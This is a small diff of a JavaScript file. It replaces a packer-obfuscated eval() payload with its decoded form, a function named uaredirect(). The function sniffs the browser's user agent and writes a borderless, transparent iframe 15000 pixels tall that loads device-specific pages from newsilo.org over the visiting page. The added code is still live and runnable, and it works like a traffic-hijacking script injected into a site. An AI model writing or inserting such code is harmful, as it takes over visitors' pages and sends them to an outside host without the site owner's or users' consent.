@@ -1,1 +1,11 @@
-﻿eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[2-9a-lo-r]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('function l(){var n=navigator.userAgent.toLowerCase();o(n.4(\'p\')>-1){5.6(\'<2><3 7="8" 9="0" a="0" b="0" c="d%" e="f" g h="i://m.j.k/p/"></3></2>\')}q o(n.4(\'iphone\')>-1||n.4(\'ipod\')>-1||n.4(\'ipad\')>-1||n.4(\'r\')>-1){5.6(\'<2><3 7="8" 9="0" a="0" b="0" c="d%" e="f" g h="i://m.j.k/r/"></3></2>\')}q{5.6(\'<2><3 7="8" 9="0" a="0" b="0" c="d%" e="f" g h="i://pc.j.k/"></3></2>\')}}l();',[],28,'||center|iframe|indexOf|document|writeln|scrolling|no|frameborder|marginheight|marginwidth|width|100|height|15000|allowTransparency|src|http|newsilo|org|uaredirect|||if|android|else|ios'.split('|'),0,{}))
+﻿function uaredirect() {
+var n = navigator.userAgent.toLowerCase();
+if (n.indexOf('android') > -1) {
+document.writeln('<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="15000" allowTransparency src="http://m.newsilo.org/android/"></iframe></center>')
+} else if (n.indexOf('iphone') > -1 || n.indexOf('ipod') > -1 || n.indexOf('ipad') > -1 || n.indexOf('ios') > -1) {
+document.writeln('<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="15000" allowTransparency src="http://m.newsilo.org/ios/"></iframe></center>')
+} else {
+document.writeln('<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="15000" allowTransparency src="http://pc.newsilo.org/"></iframe></center>')
+}
+}
+uaredirect();
